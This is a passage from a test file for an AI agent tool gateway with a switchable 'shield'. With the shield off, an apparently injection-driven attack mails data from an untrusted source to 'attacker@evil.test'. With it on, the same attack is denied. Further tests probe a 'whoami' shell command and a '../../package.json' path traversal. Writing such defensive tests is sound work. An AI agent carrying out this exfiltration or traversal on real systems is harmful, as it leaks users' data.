    expect(attack(off).map((r) => r.status)).toEqual(["ok", "ok", "ok"]);
    const sent = JSON.parse(readFileSync(path.join(off.sandbox.outbox, "out-0001.json"), "utf8"));
    expect(sent.to).toBe("attacker@evil.test");
    expect(sent.provenance.to.integrity).toBe("UNTRUSTED");

    const on = start("on", rt.dir);
    const results = attack(on);
    expect(results.map((r) => r.status)).toEqual(["ok", "denied", "denied"]);
    expect(results.map((r) => ("decision" in r ? r.decision.ruleId : null))).toEqual(["L1", "P2", "P4"]);
    expect(readdirSync(on.sandbox.outbox)).toEqual([]);

    for (const g of [off, on]) expect(g.kinds().filter((k) => k === "decision")).toHaveLength(3);
    expect(off.stores.audit.listEvents(off.run.id).every((e) => e.shieldMode === "off")).toBe(true);
  });

  it("OFF keeps structural validation and sandbox containment", () => {
    const g = start("off", rt.dir);
    expect(g.gateway.request({ tool: "exec_shell", args: { cmd: { value: "whoami" } } })).toMatchObject({ status: "denied", decision: { ruleId: "F0" } });
    expect(g.gateway.request({ tool: "read_file", args: { path: { value: "../../package.json" } } })).toMatchObject({ status: "tool_error", code: "PATH_REJECTED" });
    expect(g.gateway.request({ tool: "fetch_web", args: { url: { value: "https://example.com/" } } }).status).toBe("tool_error");
    expect(g.kinds().filter((k) => k === "outcome")).toHaveLength(2); // failed executions are audited too
  });

  it("OFF never creates approvals", () => {
    const g = start("off", rt.dir);
    expect(g.gateway.request(emailToMe("hi")).status).toBe("ok");
    expect(g.stores.approvals.listPending()).toEqual([]);
  });
});
